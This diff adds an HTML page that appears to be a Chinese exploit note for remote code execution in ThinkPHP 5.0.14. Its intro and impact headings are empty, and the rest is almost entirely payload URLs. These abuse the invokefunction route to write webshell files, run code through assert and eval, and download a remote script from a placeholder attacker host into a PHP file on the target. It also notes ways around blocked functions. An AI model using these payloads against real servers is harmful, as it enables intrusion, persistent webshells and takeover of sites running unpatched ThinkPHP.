@@ -1,0 +1,37 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="thinkphp-5014"><span class="csDE05BCC">Thinkphp 5.0.14</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="X941aeef4ff6e18c5e1436707c4331a8102cd981"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、常规命令</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">?s=index/think\app/invokefunction&amp;function=&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php.jpg&amp;vars[1][]=%3C?php%20phpinfo();?3E</span></p><h3 class="cs868C439D">
+			<a name="X31f1ea5dcde77e83fa4e6ce41818c8e4331afd3"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、</span><span class="csD1E291E2">eval</span><span class="csD6CA00D2">（</span><span class="csD1E291E2">&#39;&#39;</span><span class="csD6CA00D2">）和</span><span class="csD1E291E2">assert</span><span class="csD6CA00D2">（</span><span class="csD1E291E2">&#39;&#39;</span><span class="csD6CA00D2">）被拦截，命令函数被禁止</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</span></p><h3 class="cs868C439D">
+			<a name="Xaee3b2399500041d582511569cc81f87da05d87"><span class="csD1E291E2">3</span><span class="csD6CA00D2">、基于</span><span class="csD1E291E2">php7.2</span><span class="csD6CA00D2">环境下</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index111.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">写进去发现转义了尖括号</span></p><h3 class="cs868C439D">
+			<a name="X4d650c258103abb860d5e2d838aa2921b8eeafa"><span class="csD1E291E2">4</span><span class="csD6CA00D2">、通过</span><span class="csD1E291E2">copy</span><span class="csD6CA00D2">函数</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">&nbsp;http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.ph</span></p></body>
+</html>
